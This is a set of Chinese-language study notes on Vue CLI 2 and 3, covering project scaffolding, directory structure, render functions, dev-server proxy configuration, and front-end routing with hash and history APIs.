Setup e2e tests with Nightwatch? (Y/n) 
```
端到端测试, 它会写一个自动化测试框架的 这里想让你依赖于Nightwatch

Nightwatch会结合selenlum 它俩配合可以写出一套端到端的代码, 项目可以在浏览器上自动化测试, 它可以自动操作浏览器 比如按钮的点击等, 就不需要手动的去点击测试了

最后一步是问以后管理项目是用npm 还是用 yarn

<br><br>

# Vue Cli2 目录结构解析 sudo
cli3以上据说没有build和config文件夹了

```
  |- build          webpack相关的配置
  |- config         webpack配种中使用的变量
  |- node_modules
  |- src
    |- assets       资源放在这里 图片 css等
    |- components
    App.vue
    main.js

  |- static
  (在这里放一些静态的资源 放在这里面的资源会原封不动的复制到dist文件夹里面放在src里面的文件会根据limit还判断是否转换但是放到这里面的文件不会转换原封不动的会复制到dist文件夹中)         
                    
    .gitkeep
    (加上这个文件的话 不管文件夹是否为空都上传到服务器)

  .babelrc
  (如果我们安装包的时候安装的是 babel-preset-env 会要求单独有一个babelrc文件 这里面写相关的配置)

  ( 对babelrc的解析
    {
      "presets": [
        ["env", {
          "modules": false,
          "targets": {

            // babel的主要作用就是把es6转换为es5, 哪些语法转哪些语法不转呢? 当我们适配浏览器的时候适配这些就可以了 市场份额>1%的 这些浏览器我们适配 并且是最后的两个版本 ie<=8就不用考虑了
            "browsers": ["> 1%", "last 2 versions", "not ie <= 8"]
          }
        }],

        // es有很多的阶段0-5 我们现在转化的代码只针对2这个阶段
        "stage-2"
      ],

      // 转换过程中依赖的插件
      "plugins": ["transform-vue-jsx", "transform-runtime"]
    }

  )

  .editorconfig
  (对代码做一些统一 缩进的风格等 换行等 项目正规的话肯定有这个文件)

  .eslintignore
  (有些时候我们再写代码的时候可能不规范 但是我想对一些文件进行忽略就是不要针对这个文件做检查了)

  .eslintrc.js
  (代码检测配置的相关东西)

  .gitignore
  (有些文件不需要上传到服务器, 我们就可以写在这里面 忽略的意思)

  .postcssrc.js
  (在css转化的时候配置的一个东西)

  index.html
  (index模板, 打包的时候会根据这个模板在dist文件夹中生成index.html文件)
  package.json

  package-lock.json
  (
    当我们写^ ~的时候并不是明确要指定安装响应的版本
    ~ A.B.C
    ^ A.B.C

    ^ 会安装大于指定版本 c变
    ~ b c变

    做映射的因为实际安装的版本可能不一样
  )

  README.md
```

读取上面结构的思路 从 package.json开始找 看看执行命令
```js 
"dev": "webpack-dev-server --inline --progress --config build/webpack.dev.conf.js",

// npm run build 打包项目 最终会执行build/build.js文件
"build": "node build/build.js"
```

/build.js 代码中 我们抽取部分解释
```js 
const rm = require('rimraf');
const webpackConfig = require('./webpack.prod.conf')


// rm是removies的缩写 它是要执行命令去删除原来打包过的dist文件夹, 意思是如果是第二次执行 npm run build的时候 它会将之前打包的dist文件夹删除一下, 然后再通过webpack配置一些东西


rm(path.join(config.build.assetsRoot, config.build.assetsSubDirectroy), err => {
if (err) throw err
// 上面的地方是删除dist文件夹 如果有异常抛出异常


// 如果没有异常在这里找webpack的相关配置 根据相关的配置进行打包
// 这个webpack的配置 ./webpack.prod.conf 在这里

webpack(webpackConfig, (err, stats) => {
  spinner.stop()
  if (err) throw err
  process.stdout.write(stats.toString({
    colors: true,
    modules: false,
    children: false, // If you are using ts-loader, setting this to true will make TypeScript errors show up during build.
    chunks: false,
    chunkModules: false
  }) + '\n\n')

  if (stats.hasErrors()) {
    console.log(chalk.red('  Build failed with errors.\n'))
    process.exit(1)
  }

  console.log(chalk.cyan('  Build complete.\n'))
  console.log(chalk.yellow(
    '  Tip: built files are meant to be served over an HTTP server.\n' +
    '  Opening index.html over file:// won\'t work.\n'
  ))
})
```

<br><br>

# 分析脚手架结构
当我们执行完 ``npm run serve`` 命令之后 它直接就会去执行 main.js 文件

<br>

### **分析 main.js 入口文件**
该文件是整个项目的入口文件

```js 
  import Vue from 'vue'               // 脚手架会自动安装vue
  import App from './App.vue'         // 引入所有组件的父组件

  Vue.config.productionTip = false    // 关闭 vue的生产提示

  new Vue({
    render: h => h(App),              // 将App组件放入容器中
  }).$mount('#app')
```


### **分析 html 文件**
```html
<%= BASE_URL %> 就是public的路径
```

```html
<head>
  <meta charset="utf-8">

  <!-- 针对ie浏览器的特殊配置 让ie浏览器以最该的渲染级别渲染页面 -->
  <meta http-equiv="X-UA-Compatible" content="IE=edge">

  <meta name="viewport" content="width=device-width,initial-scale=1.0">

  <!-- 引入 页签图标  -->
  <link rel="icon" href="<%= BASE_URL %>favicon.ico">

  <!-- 它会去package.json文件中 找项目的名字做为网站的标题 -->
  <title><%= htmlWebpackPlugin.options.title %></title>
</head>

<body>
  <div id="app"></div>
</body>
```

<br>

### **Vue中的render函数**
以前我们在研究非单文件组件的时候没有接触过 render 配置项 这里我们就来研究下render配置项是干什么的

之前我们要是使用组件 第3步 要调用组件标签是么 或者需要在 div#root 里面调用 或者 我们需要在 App组件里面写上 template配置项 在里面调用 但是我们在使用脚手架后 不用再div#root 和 template 中调用组件标签 而是通过render函数将组件渲染到页面上

<br>

**<font color="#C2185B">render: h => h(App)</font>**  
render是一个函数 该函数vue帮我们调用的 它必须有一个返回值 它的完整写法是

该函数能够接收到参数 createElement 参数的类型也是 function 我们可以借助这个参数函数渲染内容
```js 
render(createElement) {

  // 把创建好的值 返回去 
  return createElement('h3', '你好啊')
}
```

<br><br>

# runtime-compiler 和 runtime-only 的区别
我们在实际的开发中选runtime-only就可以了  
runtime-only比runtime-compiler要轻代码量少, 由于runtime-only的执行过程也比runtime-compiler少, 性能也就越高

我们看下runtime-compiler 和 runtime-only 的区别, 从代码上直观的观察它们的区别仅在main.js里面


### **runtime-compiler的使用方式**
将App.vue文件(主组件)导入main.js文件中  
在Vue实例中注册App组件  
注册后使用App组件, 插入任意位置  

代码如下:
```js 
import App from './App'

new Vue({
  el: '#app',
  components: { App },
  template: '<App/>'
})

这种方式在vue会经过下面的处理:
template -- ast -- render -- vdom -- UI
```

### **runtime-only的使用方式**
将App.vue文件(主组件)导入main.js文件中  
only在导入app后并没有在实例中进行注册, 它只用的render函数

注意: 这里没有template属性, 直接就是render函数

```js 
import App from './App'

new Vue({
  el: '#app',
  render: h => h(app)
})

这种方式在vue会经过下面的处理:
render -- vdom -- UI
```


**template -- ast -- render -- vdom -- UI**  
**render -- vdom -- UI**  

**我们对这个过程进行下解析:**
```
  执行过程图解
                          解析             编译
  vm.options:template -- parse -- ast -- compiler -- render()
                                                        ↓
                                                   virtual dom
                                                        ↓
                                                        UI
```

我们在使用Vue开发的时候, html代码都是写在一个模板里的(``<template>``)
```
<template>内容内容</template>
```

当把``<template>``模板传给vue的时候, vue会把``<template>``保存在vue实例下的options属性里, 然后vue会对``<template>``进行解析

解析成ast(抽象语法树), 然后vue会对抽象语法树(ast)进行编译(compiler), 

编译成render函数, 然后vue会通过render函数把对应的``<template>``转换为virtual dom(虚拟dom),

然后从render函数创建一些对应的dom节点形成一个虚拟dom树, 有了虚拟dom树后再渲染成真实的dom也就是最终显示在界面(ul)上的东西 


也就是说:

**runtime-compiler的话 内部执行过程是:**  
```
template -- ast -- render -- vdom -- UI
```

<br>

**runtime-only的话 内部执行过程是:**  
```
render -- vdom -- UI
```

从上面可以看出 第一种比第二种方式多了对 template -- ast 这个部分的处理逻辑
而compiler就是用来处理这部分逻辑的, 它会将 ``<template>`` 转换为 ast

也就是说以后我们在项目开发的时候都选择 runtime-only

<br><br>

# runtime-only 的 render函数
上面说了compiler多了哪部分的处理逻辑, 接下来我们研究下render函数实现了哪些功能

我们先从代码上直观的观察下render函数 
```
render: h => h(app)
```

```js 
import App from './App'

new Vue({
  el: '#app',
  render: h => h(app)
})

// 这里runtime-only直接用render函数将app渲染出来
```

```js
render: h => h(app) 可以还原成
render: function(createElement) {
  return createElement('h2', {class:'box'}, ['hellow']);
}
```

我们先说下结果, 通过render函数创建的标签会替换掉index.html中的
```html
<div id="#app"></div>
```

<br>

### **解析render函数:**
render函数中的参数h 也是一个函数 名字为 createElement函数
那我们就先看下 createElement函数

**<font color="#C2185B">createElement('标签', {标签的属性}, [标签里面的内容])</font>**  

<br>

### **createElement() 普通用法:**
```js 
// 比如我们可以通过 createElement() 创建一个 <h2>
createElement('h2', {class:'box'}, ['hello'])
↓
<h2 class='box'>hello</h2>
```

在以前的学习中我们知道 页面中的 
```html
<div id="#app"></div> 

<!-- 部分会被 <template> 中内容替换掉-->
```

如果我们使用render函数, ``<div id="#app"></div>`` 部分会被render函数创建的标签替换掉

也就是说如果我们写了这样的代码最终index.html中
```html
<div id="#app"></div> 会被替换为 <h2 class='box'>hello</h2>
```

createElement还可以写的更复杂一些, 比如我们可以在``<h2>``标签内部继续创建新的内容
```js
createElement('h2', {class:'box'}, ['我是h2的内容', createElement('button', ['按钮'])])
```

既然参数3代表着h2标签内的内容, 同时还是个数组, 代表我还可以传递其它的东西进去, 所以我又传递了一个createElement函数, 创建了一个按钮 

<br>

### **createElement() 特殊用法:**
传入组件:  
``<div id="#app"></div>`` 会被替换为 传入的组件
```js 
// 以前我们创建组件的时候 我们可以这样先创建一个变量里面写上组件内容, 然后在实例中注册
const cpn = {
  template: `
    <div>{{message}}</div>
  `,
  data() {
    return {
      message: '我是组件'
    }
  }
}

// 现在我们可以把这个组件传入 render函数里面, 传入render函数里面, 最终效果跟我们传统创建组件和使用组件的效果差不多
  
// 既然我们能传递自己创建的组件cpn 同理也能传入我们导入进来的App组件 
render: function(createElement) {
    return createElement(App);
}
// 通过这种方式会省略 将 template解析为ast的过程 性能会更好 所以一般我们开发的时候都会选择runtime-only

// 我们之所以可以这样写就是因为render函数中的形参h 可以直接传入一个组件
```


那如果我们选择了 runtime-only 的模式, 组件(.vue文件)中的template怎么办? 它就不用被解析了么?  
换句话说.vue文件中的template是由谁处理的呢?

答案是: vue-template-compiler

```
之前我们装过vue-loader和vue-template-compiler两个文件

vue-loader:   
用来加载vue文件

vue-template-compiler:
用来解析.vue文件的 它就是将.vue文件的template解析成render函数的

有了vue-template-compiler后, 它会将.vue文件中的template部分解析成render函数(也就是一个普通的对象), 所以我们在main.js引入的时候, 这个普通对象里面没有包含template信息, 这个是开发时依赖, 也就是说所有组件中的template都被解析成普通对象了
```

<br><br>

# 修改脚手架的默认配置
vue脚手架隐藏了所有webpack的相关配置 若想查看具体的webpack配置 需要执行

<br>

### **vue inspect > output.js**
该命令会把所有的webpack代码整理成一个js文件供我们查看 仅是查看不是修改

<br>

### **在package文件同级的情况下 创建 vue.config.js 文件**
下面的所有配置都在 这个文件中 书写规则 在该文件里面创建好的规则 最终会和webpack里面的配置进行合并

<br>

### **个性化的定制脚手架**
那如果我就是想改一些webpack底层配置好的文件怎么办？ 
https://cli.vuejs.org/zh/config/
在上面的网站中复制对应的内容 放在 vue.config.js 文件中 重启脚手架

<br>

### **关闭语法检查**
https://cli.vuejs.org/zh/config/#lintonsave
```js 
module.exports = {
  lintOnSave: false
}
```

<br>

### **配置代理服务器**
我们在解决跨域的问题的时候 需要配置代理服务器

下面简单说下 代理服务器开启的方式:
1. nginx
2. 借助vue-cli

<br>

### **方式1: Vue项目中配置代理:**
https://cli.vuejs.org/zh/config/#devserver-proxy

首先: 创建 vue.config.js 文件 复制下面代码 写上 目标服务器地址
```js 
module.exports = {
  devServer: {
    proxy: 'http://localhost:5000'
  }
}
```

然后: 脚手架要重新启动  

最后: 前端发送请求时候的url 要修改为代理服务器的地址(也就是前端项目所在的服务器地址)
```js 
// 比如我的脚手架开在8080 那么我发送请求的时候也要写
axios.get('http://localhost:8080')
```

<br>

**注意:**  
代理服务器并不会把所有的请求都转发给5000服务器 而是请求的资源在8080本身就有的时候 它就不会把请求转发给5000服务器 而是拿着前端已经有的资源返给你

<br>

### **方式2: Vue项目中配置多个代理:**
```js 
module.exports = {
  devServer: {

    proxy: {
      // 一套配置
      '/api1': {

        target: '<服务器地址url不用接具体接口>',
        pathRewrite: {'^/api1':''},
        ws: true,
        changeOrigin: true
      },

      // 另一套配置
      '/api2': {
        target: '<other_url>'
      }
    }
  }
}
```

```js
module.exports = {
  devServer: {
    proxy: {
      '/api': {
        target: "http://127.0.0.1:3333",
        pathRewrite: {'^/api':''},
        ws: true,
        changeOrigin: true
      }
    }
  }
}
```

**注意:**  
- 前端发请求的时候 一定要http开头
- 我们要往前端所在的服务器端口号发请求 8080
- 主机地址:端口号 + /api + /接口
```js
axios.get("http://127.0.0.1:8080/api/word")
```

<br>

### proxy对象的属性:
**<font color="#C2185B">'/api'</font>**  
请求前缀 通过 url 匹配是否含有请求前缀 如果有 则走对应代理  
请求前缀 需要紧跟端口号 剩下的原来怎么写就怎么写
```
    http://localhost:8080/students        原来
    http://localhost:8080/api/students    现在
```
请求前缀最后还需要被脱掉 它只是用来匹配是否要走代理的一个标识

<br>

**<font color="#C2185B">pathRewrite: {'^/api': ''}</font>**  
用于脱掉请求前缀 它的值是一个对象 对象内部是 正则 和 替换内容  
将以 /api 开头的前缀 替换为 空

<br>

**<font color="#C2185B">target</font>**  
需要转发给哪个地址(目标服务器地址)

<br>

**<font color="#C2185B">ws: true</font>**  
websocket这也是前端和服务端的一种通信方式 用于支持websocket

<br>

**<font color="#C2185B">changeOrigin: true / false</font>**  
发送请求到服务器的时候 服务器会问代理服务器这次请求你来自于哪里  
true   说谎      我来自于5000(服务器所在地址)  
false  不说谎    我来自于8080(前台所在地址))

**注意:**  
4 和 5 默认不写也是true

<br><br>

# 动态组件 ``<component :is="">``
### **应用场景**
tabs选项卡下 点击不同的tabs按钮展示不同的组件

**作用:**  
让多个组件使用同一个挂载点 并动态切换 这就是动态组件。  
有的时候 在不同组件之间进行动态切换是非常有用的 比如在一个多标签的界面里: 

```
-------     -------     -------
Home        Login       Categroy
--------------------------------

  组件区域 <component> 

--------------------------------
```

<br>

### **``<component :is="pageView">`` 元素**
``<component>`` 的作用相当于 router-view 用于呈现组件的区域  
我们通过 :is 属性 绑定对应的组件

比如完成上述的 点击tabs按钮展现不同的组件 可以这样
```js 
// 1. 引入组件
import Home from "./components/Child/Home.vue"
import Login from "./components/Child/Login.vue"
import Categroy from "./components/Child/Categroy.vue"


// 2. 在合适的位置使用 <component> 元素
<div id="app">
  <button @click="changePage">切换页面</button>
  <component :is="pageView"></component>
</div>


// 3. :is 这里我 绑定组件 我们动态的从组件数组中获取组件
data() {
  return {
    index: 0,
    arr: [Home, Login, Categroy], 
},

// :is 会绑定计算属性 从计算属性中得到具体的组件
computed: {
  pageView() {
    return this.arr[this.index]
  }
}

// 
methods: {
  changePage() {
    this.index = (++this.index) % 3
  }
},
``` 

<br><br>

# eslint规范
- 末尾不能有多余分号
- 函数名和参数括号之间要有空格
- 函数定义后必须被调用
- 代码的缩进2个
- eslint希望末尾不要加分号

<br>

### **如果在脚手架中把定义好eslint关闭**
config文件夹  -- index.js -- useEslint: false

<br><br>

# Vue Cli3 
cli3 与 cli2 版本有很大的区别
cli3 基于 webpack4打造, cli2 还是 webpack3

cli3的设计原则是"0配置", 移除的配置文件根目录下的build和config等目录

cli3提供了vue ui命令, 提供了可视化配置, 更加的人性化

移除了static文件夹, 新增了public文件夹, 并且index.html移动到public中


# Vue Cli3 初始化项目的过程 以及 目录结构

Please pick a preset: (Use arrow keys)
### **default (babel, eslint)**
  Manually select features

```js 
  选择配置
  1. 默认配置, 默认的话会默认添加babel 和 eslint
  2. 手动选择特性, 按空格选择特性 回车下一步
  >(*) Babel
   ( ) TypeScript
   ( ) Progressive Web App (PWA) Support    
   ( ) Router
   ( ) Vuex
   ( ) CSS Pre-processors
   ( ) Linter / Formatter     检测代码用的eslint
   ( ) Unit Testing
   ( ) E2E Testing
```

? Where do you prefer placing config for Babel, PostCSS, ESLint, etc.? (Use arrow keys)
### **In dedicated config files**
  In package.json
```js 
  配置文件是放到独立的配置文件里 还是放在package.json里面

  老师选的是单独
```

? Save this as a preset for future projects? (y/N)
```js 
  future 将来

  需要不需要把上面的配置保存为一个个人项目 再次通过cli3创建的时候可以选择你自己配置好的项目

  手动删除路径
  c -- users -- admin -- vuerc -- prest
```

? Save preset as:
```js 
  上面如果选择y的话, 会跳到这里 保存个什么名字
```


### **目录结构**
```js 
  |- node_modules

   // 相当于cli2的static, 这里面的东西会原封不动的复制到dist里
  |- public
    favicon.ico
    index.html

  // 源代码
  |- src          
    |- assets
    |- components
    App.vue
    main.js

  // 配置浏览器相关的东西大于市场份额的1% 最后两个版本 不考虑ie8
  .browserslistrc 

  // 忽略文件, 不想上传到服务器 不想给同事共享的话
  .gitignore      
  babel.config.js 

  package.json
  package-lock.json
 
  README.md
```

### **npm run serve**
测试代码效果

### **npm run build**
打包文件      


### **cli3中的 main.js**
```js 
  import Vue from 'vue'
  import App from './App.vue'

  // 在执行npm run build的时候会有一些提示信息 比如构建了什么东西 发布的时候可以选成true, 在终端那里会提示你在打包什么东西
  Vue.config.productionTip = false

  new Vue({
    render: h => h(App),
  }).$mount('#app')

  // 我们在使用el:'#app'挂载app的时候 内部其实还是在执行 $mount('#app') 两种写法都可以
```

<br><br>

# Vue Cli3 配置文件的查看和修改
在cli3中要想修改配置的话有三种方案

<br>

### **方式1: 启动配置服务器: 命令: vue ui**
在终端里输入 vue ui的话就会启动一个本地服务, 它帮助我们管理很多的项目 会弹出来一个网页, 跑在本地服务器上面的  

**创建:**  
可以通过图形可视化创建一个项目

**导入:**  
我们可以通过这个选项导入我们的创建的项目, 然后左侧会出现菜单

**仪表盘:**  
插件    会显示当前装了什么插件  
依赖    这里还可以可视化的安装依赖  
配置    可视化的配置东西  
里面有css的预处理配置, 但是默认只编译css文件, postcss还需要额外的配置

**任务:**  
这里可以可视化的运行项目

<br>

### **方式2:**
```
\node_modules\@vue\cli-service
```

这里面有个webpack.config.js 这里面导入了

```
const Service = require('./lib/Service')
```

所以我们去 ./(当前文件夹) /lib/Service.js 它把配置隐藏在这里了

<br>

### **方式3: vue.config.js**
在项目的根目录下创建 vue.config.js 文件 文件名固定 通过下面的方式, vue会把我们手写的配置和隐藏起来的配置进行合并的
```
module.exports = {

}
```

<br><br>

# 路由 映射关系
路由是一个网络工程里面的术语, routing就是通过互联的网络把信息从原地址传输到目的地址的活动 简单的理解就是将信息从一个地方转发到另一个地方

上面的理解还是有些抽象 在生活中, 我们有没有听说过路由的概念? 路由器嘛, 路由器提供了两种机制 **路由和转送**

**路由:**  
决定数据包从来源到目的地的路径

<br>

**转送:**  
将输入端的数据转移到合适的输出端

<br>

**路由表:**  
路由中有一个非常重要的概念叫路由表 路由表本质上就是一个映射表, 决定了数据包的指向

```
  猫会拉出一条网线插在路由器上, 然后我们就可以通过路由器上网, 每一台链接路由器的设备, 都会被分配到一个ip地址 
  
  比如: 192.168.1.100, 而猫本身也会有一个ip地址
  猫本身的ip地址叫做公网ip 比如202.111.23.45, 作为网址中的唯一标识

  由路由器给我们设备分配的ip叫做内网ip  
  内网ip只有在当前的网络里面内网ip才是有效的, 平时我们看见的192.168.1.1之类都是用于配置内网ip地址的

  互联网中的ip地址是唯一的指的是公网ip地址, 这个地址是永远不能重复的

  比如 朋友给我发送一条 北京下雪了 它会通过双方的公网ip地址 把内容发送到我的路由器上, 然后通过映射表(内网ip和设备的mac地址关系的表)将信息发送到对应的设备上
```

<br><br>

# 前端渲染和后端渲染
说到这两个术语, 我们要从网络的发展史来说起

### **后端渲染**
网页的渲染并不是在前端渲染出来的, 是后端那边通过一些特殊的技术在后台渲染好了, 而这个渲染的过程是在服务端渲染的, 也叫作服务端渲染

在很久以前开发网页的时候都是通过 html+css+jsp/php 后端渲染对于seo会比较好

我们简单的看看后端渲染的流程:

```
比如我们再地址栏上输入 www.taobao.com, 这个地址就会发送到服务器里面

早期的时候, 服务器拿到我们的地址, 会将地址进行解析看看我们要请求什么样的网页
服务器会对发送过来的地址进行判断, 比如判断出 哦~ 原来请求的是首页

服务器就会在后台这边通过jsp的技术, 会直接将要请求的网页写好(网页中包含了htmlcssjava的代码, java的代码的作用是从数据库中读取数据并将数据动态的渲染到页面中)

也就是说我们请求的页面在服务器里就已经是一个成品网页了, 然后将这个网页直接发送给浏览器端, 这个网页中的代码只有html和css

比如这时候我们在淘宝首页上点击了一个链接, 会跳转到另一个页面
这个页面也会发送给服务器 服务器也会对这个url进行解析, 然后服务器在后台 通过jsp等技术在后端再次渲染出一个页面, 直接传给前端, 前端展示最终的网页

当页面多的时候, 请求的url和后台渲染的页面会形成一个映射关系 比如
taobao   --- 渲染出来的淘宝页面
淘宝男装  --- 渲染出来的淘宝男装页面
淘宝女装  --- 渲染出来的淘宝女装页面

这种映射关系的存储和处理是服务器在帮我们处理
```

<br>

### **后端路由**
后端帮我们处理url和页面之间的映射关系的, 这种就叫做后端路由 就是看上述的映射关系是谁帮我们处理谁帮我们保存

早期的网站开发整个html页面是由服务器来渲染的, 然后直接生产渲染好对应的html页面返回给客户端进行展示

但是一个网站,这么多的页面服务器如何处理?   
一个页面有自己对应的网址, 就是url, url会发送到服务器, 服务器就会通过正则对该url进行匹配, 并且最后交给一个Controller进行处理

Controller进行各种处理, 最终生成html或者数据, 返回前端, 这就完成了一个io操作

上面的这种操作就是后端路由  
当我们页面中需要请求不同的路径内容时, 交给服务器来进行处理, 服务器渲染好整个页面, 并且将页面返回给客户端, 这种情况下渲染好的页面, 不需要单独加载任何的js和css, 可以直接交给浏览器展示, 这样也有利于seo的优化 

<br>

### **后端路由的缺点**
一种情况是整个页面的模块由后端人员来编写和维护的  
一种情况是前端开发人员如果要开发页面, 需要通过php和java等语言来编写页面代码
而且通常情况下html代码和数据以及对应的逻辑会混在一起, 编写和维护都是非常糟糕的事情

<br>

### **前后端分离阶段**
随着ajax的出现, 有了前后端分离的开发模式  
后端只提供api来返回数据, 前端通过ajax获取数据, 并且可以通过js将数据渲染到页面中

这样做最大的优点就是前后端责任的清晰, 后端专注于数据上, 前端专注于交互和可视化上, 并且当移动端(ios android)出现后, 后端不需要进行任何处理, 依然使用之前的一套api即可

<br>

### **前端渲染**
浏览器中显示的网页中的大部分内容, 都是由前端的js代码在浏览器中执行, 最终渲染出来的网页 目前很多的网站依然采用这种模式开发

**前后端分离阶段:**  
后端只负责提供数据 不负责任何阶段的内容
```
                  静态资源服务器
      这里存储着我们部署到服务器上的所有网页的相关代码


客户端(浏览器)                    服务器              数据库
                            提供api接口的服务器

    html
    css                   ↗
    js   将包含ajax代码发送到
```

我们写好的代码其实都是部署到静态资源服务器

当我们输入了url后, 其实不是直接从服务器拿东西的而是从静态资源服务器里面拿, 而我们写的所有代码都是放在静态资源服务器里面的

从静态资源服务器里取得html css js到浏览器端, htmlcss代码浏览器可以直接渲染, js部分必须由浏览器来执行, js代码中会包含ajax请求, 浏览器执行到ajax请求后会将ajax中的url(api接口)发送 接口服务器中请求api相对应的资源

然后接口服务器将对应的数据返回到客户端(浏览器)上 浏览器端拿到大量的数据后, 通过js代码动态渲染到页面上

也就是我们现在网页的渲染不是在服务器端, 而是通过ajax请求回来的数据, 在浏览器端通过js代码渲染页面

<br>

### **单页面富应用阶段**
其实spa最主要的特点就是在前后端分离的基础上加了一层前端路由, 也就是前端来维护一套路由规则
```
                    静态资源服务器
      这里存储着我们部署到服务器上的所有网页的相关代码


客户端(浏览器)                    服务器              数据库
                            提供api接口的服务器
```

url: jd_man.com  
它也会先去静态资源服务器获取jd_man.com的html css js文件  

htmlcss直接渲染到页面中, 然后浏览器执行js代码, js代码的ajax部分去接口服务器请求数据, 然后js部分负责把请求回来的数据动态渲染到页面中 这就是第二个阶段前后端分离(通过ajax)

下面我们再看看看第三个阶段, spa页面

<br>

### **SPA 单页面富应用**
simple page webapplication, 整个网页只有一个html页面, 只有一个页面怎么行呢? 比如即有首页又有关于等页面怎么办?

我们看看结构图:
``` 
  

                  静态资源服务器
                里面放着html+css+js


客户端浏览器      接口服务器(api服务器)     数据库
```

**在前后端分离阶段:**  
静态资源服务器里放着好几套html+css+js 每一套对应一个url页面, 我们开发的网站每一个网站对应着一套css html js

```
url1 -- > 一套 html css js
url2 -- > 一套 html css js
url3 -- > 一套 html css js
```

<br>

**在单页面富应用阶段:**  
静态资源服务器里只有一套 index.html css js 这一套里面有网站首页子页的所有信息

我们在浏览器中输入 url, 会从静态资源服务器中把 那一套html css js下载下来  
下载下来后并不会把html css js的内容渲染到页面中 而是根据情况, <font color="#C2185B">把对应的信息抽取出来 渲染到页面里</font>  

比如我们有三个按钮, 首页, 关于, 我的  
当我点击 **我的** 按钮时, 把我的的相关内容从html css js文件中抽离出来渲染到对应的位置 这样即使是一套html css js也形成了三个页面, 要达到这点, 就必须有 前端路由的支撑

<br>

### **前端路由**
其实spa最主要的特点就是在前后端分离的基础上加了一层前端路由, 也就是前端来维护一套路由规则

前端路由中会配置一些映射关系, 当我点击一个按钮的时候会生成一个url

比如 我点击 **首页** 按钮, 就会生成一个 url:shouye.com/home

这时候注意, 不是像前后端分离阶段, 一旦生成url就会去静态资源服务器里请求一套htmlcssjs文件

但是前端路由不会, 它生成的url并不会去静态资源请求资源, 它只会通过js代码的判断去我们从静态资源服务器中请求下来的数据里把相对应的资源抽离出来渲染到页面中

比如 我们点击 *关于* 按钮, 就会生成一个 url:shouye.com/about
会根据这个url再去我们从静态资源服务器中请求下来的数据里 抽取一部分数据渲染到页面中

其实我们抽取的这一部分资源就是相当于vue的一个组件 比如我们之前学的webpack打包, 会把所有的组件打包在一个index.html中, 其实每一个组件就可以是一个页面, 我们把所有的组件打包在一个js文件中, 看起来是一个js, 其实这个js中包含了很多个东西

前端会自动监听浏览器 一旦发现生成的url是这个页面 就会马上去js文件这个大的资源中, 找到这个组件的相关东西在页面上进行一个渲染

也就是spa页面必须有前端路由做支撑, 而前端路由就是用于映射浏览器上生成的url和main.js中到底要渲染哪一个组件的映射关系

``` 
  url1: www.sam.com/home    --- js组件中对应的部分
  url2: www.sam.com/about   --- js组件中对应的部分
  url3: www.sam.com/me      --- js组件中对应的部分
```

而上述的映射关系就是在前端管理所以这就叫做前端路由

<br>

### **前端路由的核心**
改变url(在地址栏输入地址) 页面是不进行整体刷新的(如果重写了url 默认是会向服务器请求新的资源的)

<br><br>

# url的hash 和 html5的history
上面介绍了前端路由的概念, 它的核心就是改变url的时候让页面不要刷新

因为只要改变了地址栏里的url默认 它会重新向服务器请求资源, 但现在我不让它刷新, 因为我要让它在前端这边改变

<br>

### **url的hash**
url的hash也就是锚点, 本质上是改变window.loacation的href属性  
我们可以通过直接赋值location.hash来改变地址(href), 但是页面不发生刷新

<br>

**<font color="#C2185B">location.hash</font>**  
我们可以通过这种方式去改变url, 实现页面不刷新

当前页面: http://localhost:8080/ 通过location.hash = 'xxx'
```js
  // 给url赋值一个hash
  location.hash = 'aaa'
```

**结果:** http://localhost:8080/#aaa
我们改变了url但是网页并没有刷新, 然后我们通过前端路由在路由表中找到映射去请求组件, 把组件在页面中进行渲染

<br>

**<font color="#C2185B">history.pushState()</font>**  
我们通过这种方式改变url页面也不会刷新 这种方式有些像压栈和出栈

**参数1:**  
{data}: 状态对象, 可传空

**参数2:**  
title: 新网页的标题, 可传空

**参数3:**  
?url: 新的网址, 必须和当前页面在同一个域

```js 
history.pushState({}, '', 'home')

// 结果
http://localhost:8080/home
```

<br>

**<font color="#C2185B">pushState() 和 back() 相当于入栈和出栈</font>**  
我们的栈结构相当于一个杯子, 栈只有一个入口和出口, 这里我们的pushState()方法相当于入栈, back()方法相当于把栈顶的东西移除掉

```js 
history.pushState({}, '', 'home')     push  home
history.pushState({}, '', 'about')    push  about
history.pushState({}, '', 'me')       push  me
```
```
|         |
|  me     |     栈结构
|  about  |
|  home   |
|_________|
```

我们使用 ``pushState()`` 方便连续的向栈中压入了3个url  
第一次压入的会在栈底 而我们从栈中拿数据的时候, 只能从栈顶开始拿, 所以它有个规则叫做 先进后出 栈顶上的url也是我们地址栏上显示的最新url, 这个url永远是最后压入的

一旦我调用 ``history.back()`` 就会将栈顶的东西移除掉, 就会显示接下来在栈顶的数据, 所以push 和 back相当于入栈和出栈的操作

<br>

**<font color="#C2185B">history.replaceState()</font>**  
参数跟pushState()方法中的参数一样    
会用我们传入的url替换掉之前的url, back()方法(后退按钮将没有作用)
```js 
// 当前url
http://localhost:8080/home

history.replaceState({}, '', 'about');
http://localhost:8080/about
```
但是是将http://localhost:8080/about 替换成 http://localhost:8080/home
所以不会产生后退按钮, 没有历史记录

<br>

**<font color="#C2185B">history.go()</font>**  
go()方法, 只能和 pushState()方法配合使用, 因为go()方法会跳到指定的栈中的位置

参数是数字   
正数是将url压入栈中  
负数是将url弹出栈顶

```js 
history.pushState({}, '', 'home')     push  home
history.pushState({}, '', 'about')    push  about
history.pushState({}, '', 'me')       push  me
```
```
|         |
|  me     |     栈结构
|  about  |
|  home   |
|_________|
```

```js 
  history.go(-1);
  // 弹出栈顶的me 会显示about
```

```js 
history.go(1)   相当于 history.forward()
history.go(-1)  相当于 history.back()
```

<br><br>

# 路由router
对于路由的理解 可以理解为 路由器和每一台电脑之间的关系 比如路由器后面的接口 就会对应着一台电脑 那么接口和电脑之间的关系就相当于一组组的key + value = 一组路由

路由和路由器的关系就是多个路由得由一个路由器进行管理
```js 
      路由器 router

接口    接口    接口 route
  
  |      |       |

电脑    电脑    电脑


接口 + 电脑 = key + value = 路由
```

<br>

### **路由的概念 router**
所谓的路由就是一组key-value的对应关系 多个路由需要经过路由器的管理 router会监测path的变化 当发现符合规则的 路径时/user 就显示对应的组件

vue-router是一个插件库 专用用来实现spa的应用, spa中的数据需要通过ajax来获取
既然是插件库 那么肯定需要 npm i  Vue.use()吧

<br>

### **前端路由 和 后端路由**
**前端路由:**   
理解:  value是component 用于展示页面内容
流程:  当浏览器的路径改变的时候 对应的组件就会显示

<br>

**后端路由:** 
理解:  value是function 用于处理客户提交的请求  
流程:  服务器收到一个请求时 根据请求路径找到匹配的函数来处理请求 返回响应数据

<br>

